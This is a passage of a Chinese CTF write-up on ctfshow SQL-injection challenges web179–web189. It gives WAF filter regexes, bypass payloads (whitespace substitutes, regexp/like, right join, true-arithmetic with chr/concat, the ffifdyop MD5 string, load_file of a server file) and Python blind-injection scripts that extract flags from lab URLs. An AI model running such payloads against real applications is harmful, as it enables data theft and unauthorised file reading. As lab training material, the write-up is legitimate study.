title="web179"></a>web179</h1><h3 id="、-09、-0a-d绕过空格过滤-2"><a href="#、-09、-0a-d绕过空格过滤-2" class="headerlink" title="/**/、%09、%0a-%d绕过空格过滤"></a>/**/、%09、%0a-%d绕过空格过滤</h3><p><code>/**/</code>等都被过滤了，可以使用%0c和%0d绕过过滤。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;%<span class="number">0</span>cunion%<span class="number">0</span>cselect%<span class="number">0</span>c1<span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>password%<span class="number">0</span>cfrom%<span class="number">0</span>cctfshow_user%<span class="number">0</span>c--%<span class="number">0</span>c</span><br></pre></td></tr></table></figure><h1 id="web180-web182"><a href="#web180-web182" class="headerlink" title="web180-web182"></a>web180-web182</h1><p>过滤了所有的空白符号。<br>这里网上给的办法是直接去根据id直接查，其实也可以。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;||id=<span class="number">26</span>||&#x27;</span><br><span class="line">或者</span><br><span class="line"><span class="number">-1</span>&#x27;or(id=<span class="number">26</span>)and&#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure><p>可以使用第二种这种将末尾的单引号闭合就可以不用注释符号了</p><h1 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h1><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function waf($str)<span class="punctuation">&#123;</span></span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;<span class="punctuation">,</span> $str);</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>有两种payload。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span>POST<span class="punctuation">]</span>PAYLOAD<span class="punctuation">:</span></span><br><span class="line">tableName=`ctfshow_user`where((substr(`pass`<span class="punctuation">,</span><span class="number">1</span><span class="punctuation">,</span><span class="number">8</span>)regexp(<span class="string">&quot;ctfshow&#123;&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>POST<span class="punctuation">]</span>PAYLOAD<span class="punctuation">:</span></span><br><span class="line">tableName=(ctfshow_user)where(pass)like&#x27;ctfshow<span class="punctuation">&#123;</span>%<span class="number">25</span>&#x27;</span><br></pre></td></tr></table></figure><p>这里分别解释一下两个语句：</p><h2 id="regexp和like关键字-和-标识符"><a href="#regexp和like关键字-和-标识符" class="headerlink" title="regexp和like关键字 %和_标识符"></a>regexp和like关键字 %和_标识符</h2><p>第一个payload：<br>REGEXP 是 SQL 中的一个模式匹配操作符，它用于在字符串中查找与给定的正则表达式匹配的子串。<br>第二个paylaod：<br>LIKE操作符使用字符串匹配模式来比较列的值，常见的模式匹配特殊字符是 % (百分号) 和 _ (下划线)。<br>‘aa%’：这是一个用于匹配的模式。在这个例子中，’aa%’表示以”aa”开头的任意字符或字符串。%是LIKE操作符的通配符，代表任意数量的字符（包括零个字符）。<br>也就是匹配<code>aabbs</code><br>当我们使用 LIKE 操作符和下划线 _ 结合时，它表示匹配单个字符的任意位置，类似于通配符?<br>也就是匹配<code>aab</code><br>这里使用py写脚本。<br>第一种：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL盲注.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 17:49   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://0d89238a-2c87-4371-b427-2670ebb10351.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789-abcdefghijklmnopqrstuvwxyz&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;(ctfshow_user)where(pass)regexp&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(flag_pre + j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 1&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL盲注.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 17:49   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://0d89238a-2c87-4371-b427-2670ebb10351.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789-abcdefghijklmnopqrstuvwxyz&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;(ctfshow_user)where(pass)like&quot;&#123;&#125;%&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(flag_pre + j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;count = 1&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h1><h3 id="右连接"><a href="#右连接" class="headerlink" title="右连接"></a>右连接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($<span class="built_in">str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, $<span class="built_in">str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="什么是右连接"><a href="#什么是右连接" class="headerlink" title="什么是右连接"></a>什么是右连接</h2><p>SQL 中的右连接（Right Join）用于将两个表按照指定的列进行连接，并返回右侧表中所有行及其与左侧表中匹配行的列值，如果左侧表中没有匹配的行，则返回 NULL 值。<br>比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT columns</span><br><span class="line">FROM table1</span><br><span class="line">RIGHT JOIN table2</span><br><span class="line">ON table1.column = table2.column;</span><br></pre></td></tr></table></figure><p>比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT students.name, scores.score</span><br><span class="line">FROM students</span><br><span class="line">RIGHT JOIN scores</span><br><span class="line">ON students.<span class="built_in">id</span> = scores.student_id;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用 RIGHT JOIN 将 scores 表右连接到 students 表上，按照 students.id 和 scores.student_id 进行连接，查询学生姓名和对应的成绩。如果 scores 表中没有匹配的行，则返回 NULL 值。<br>因此这道题里面就可以使用如下payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName<span class="operator">=</span>ctfshow_user <span class="keyword">as</span> a <span class="keyword">right</span> <span class="keyword">join</span> ctfshow_user <span class="keyword">as</span> b <span class="keyword">on</span> b.pass <span class="keyword">like</span> <span class="number">0x63746673686f7725</span></span><br></pre></td></tr></table></figure><p><code>0x63746673686f7725</code>是ctfshow%的十六进制编码<br>python中可以使用以下代码实现转换为十六进制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="built_in">print</span>(binascii.b2a_hex(<span class="built_in">str</span>(<span class="string">&#x27;ctfshow%&#x27;</span>).encode()).decode().replace(<span class="string">&quot;b&#x27;&quot;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure><p>然后就可以写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL盲注2.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 19:49   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_2hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param s: 需要转为十六进制的字符串</span></span><br><span class="line"><span class="string">    :return: 十六进制结果</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(s.encode()).decode().replace(<span class="string">&quot;b&#x27;&quot;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://303b0ea1-6fc8-4947-9730-47d85b4a3c1c.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(<span class="string">&#x27;0x&#x27;</span> + _2<span class="built_in">hex</span>(flag_pre + j + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 43&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意，判断条件的43是使用payload所知道的。<br> 此外，还可以使用如下payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=ctfshow_user group by <span class="keyword">pass</span> having <span class="keyword">pass</span>  like <span class="number">0x63746673686f7725</span></span><br></pre></td></tr></table></figure><h2 id="group-by和having关键字"><a href="#group-by和having关键字" class="headerlink" title="group by和having关键字"></a>group by和having关键字</h2><p>HAVING 是 SQL 中用于对分组后的结果进行筛选的关键字。它通常与 GROUP BY 关键字一起使用，用于对分组后的结果进行聚合计算和筛选。<br>比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT student, AVG(score) AS avg_score</span><br><span class="line">FROM scores</span><br><span class="line">GROUP BY student</span><br><span class="line">HAVING avg_score &gt;= <span class="number">90</span>;</span><br></pre></td></tr></table></figure><p><code>HAVING pass LIKE 0x63746673686f7725 </code>对分组后的结果进行筛选，只返回 pass 列中包含字符串 <code>0x63746673686f7725</code> 的分组。<br>这里就不写脚本了，注意所对应的条件是返回中存在<code>$user_count = 1</code></p><h1 id="web185、web186"><a href="#web185、web186" class="headerlink" title="web185、web186"></a>web185、web186</h1><h3 id="使用true关键字等来绕过数字过滤-chr函数"><a href="#使用true关键字等来绕过数字过滤-chr函数" class="headerlink" title="使用true关键字等来绕过数字过滤 chr函数"></a>使用true关键字等来绕过数字过滤 chr函数</h3><p>数字被过滤了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>true关键字再mysql中等价为1，也就是可以true+true=2，因此可以由此构造出任何数字。<br>因此我们可以字符串-&gt;转为十进制数字-&gt;chr和concat函数拼接合成为payload中的需要字符串。<br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL盲注3.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 20:16   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将数字转换为true相加</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num2True</span>(<span class="params">num</span>):</span><br><span class="line">    a = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> num != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num - <span class="number">1</span>):</span><br><span class="line">            a += <span class="string">&#x27;+true&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将文本转换为concat和chr函数结合的格式</span></span><br><span class="line">    <span class="comment"># 比如：aa -&gt; chr(一大堆true相加),chr(又一大堆true相加)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_style</span>(<span class="params">s</span>):</span><br><span class="line">    str1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    str1 += <span class="string">&#x27;chr(&#x27;</span> + num2True(<span class="built_in">ord</span>(s[<span class="number">0</span>])) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        str1 += <span class="string">&#x27;,chr(&#x27;</span> + num2True(<span class="built_in">ord</span>(i)) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> str1</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://76c1b9c5-22be-4d38-8e83-4cdf71d2b93a.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;&#125;))&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(change_style(flag_pre + j + <span class="string">&#x27;%&#x27;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 43&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>不止有true可以生成任意数字，以下几个函数也可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ceil() floor() true version() pi()</span><br></pre></td></tr></table></figure><h1 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h1><h3 id="绕过sqlMD5加密的万能串ffifdyop"><a href="#绕过sqlMD5加密的万能串ffifdyop" class="headerlink" title="绕过sqlMD5加密的万能串ffifdyop"></a>绕过sqlMD5加密的万能串ffifdyop</h3><p>用MD5加密密码，<code>ffifdyop</code>正好可以得到<code>&#39;or&#39;6�]��!r,��b</code><br>也就达到了绕过的目的。<br>注意flag在返回包中。</p><h1 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h1><h3 id="弱比较-sql中-等价于or"><a href="#弱比较-sql中-等价于or" class="headerlink" title="弱比较 sql中||等价于or"></a>弱比较 sql中||等价于or</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//密码判断</span><br><span class="line"> <span class="keyword">if</span>($row[<span class="string">&#x27;pass&#x27;</span>]==intval($password))&#123;</span><br><span class="line">     $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">     array_push($ret[<span class="string">&#x27;data&#x27;</span>], array(<span class="string">&#x27;flag&#x27;</span>=&gt;$flag));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>flag为字符串，字符串的intval永远为0.因此传入0即可。<br><code>username=1||1&amp;password=0</code></p><h1 id="web189"><a href="#web189" class="headerlink" title="*web189"></a>*web189</h1><h3 id="布尔盲注-if-load-file-locate"><a href="#布尔盲注-if-load-file-locate" class="headerlink" title="布尔盲注 if load_file locate"></a>布尔盲注 if load_file locate</h3><p>提示里有说：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag在api/index.php文件中</span><br></pre></td></tr></table></figure><p>那么这里就需要盲注来解决。<br>mysql导入外部文件查询。</p><ul><li>load_file(path)导入文件</li><li>locate(substr,str)获取匹配到的字符串位置</li></ul><p>这道题的payload就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(locate(<span class="string">&quot;ctfshow&#123;&quot;</span>,<span class="string">&#x27; + &#x27;</span>load_file(<span class="string">&quot;/var/www/html/api/index.php&quot;</span>))&gt;这里是位置,<span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>让我们看看gpt怎么说<br>如果 ‘ctfshow{‘ 在 “/var/www/html/api/index.php” 文件的内容中存在，并且位置大于 1（即找到了），那么条件表达式 locate(“ctfshow{“,’ + ‘load_file(“/var/www/html/api/index.php”))&gt;1 将返回真，进入条件为真的分支，即返回 0。<br>接下来就是写脚本。<br>这个脚本最开始每太想出来怎么写，看了下大佬们的wp，才明白。这里会将wp中的脚本也列举出来。<br>脚本的思路就是，先搜索到flag的位置，然后一步一步给他读出来。<br>盲注需要找到回显的地方。<br>可以注意到，密码为0时，当账号为0，返回的是密码错误<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075241167-f497b6be-cc54-40e6-8a25-06d580071436.png" alt="image.png"><br>当账号为1时，返回的是查询失败<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075274763-4a0331a8-9216-4583-ae04-4d2e80f13121.png" alt="image.png"><br>勾<del>吧，payload测试一半不能用了，以为是写错了，重启靶场就好了。</del><br>用下面这个来看是什么字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr(load_file(<span class="string">&#x27;/var/www/html/api/index.php&#x27;</span>),&#123;&#125;,<span class="number">1</span>)=(<span class="string">&#x27;&#123;&#125;&#x27;</span>),<span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>勾吧题， wp很好理解，脚本写了三个小时整。<br>6点48开始写 9点48才写完。太抽象了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689083298083-26b2335c-3036-4323-a955-54b23f46827f.png" 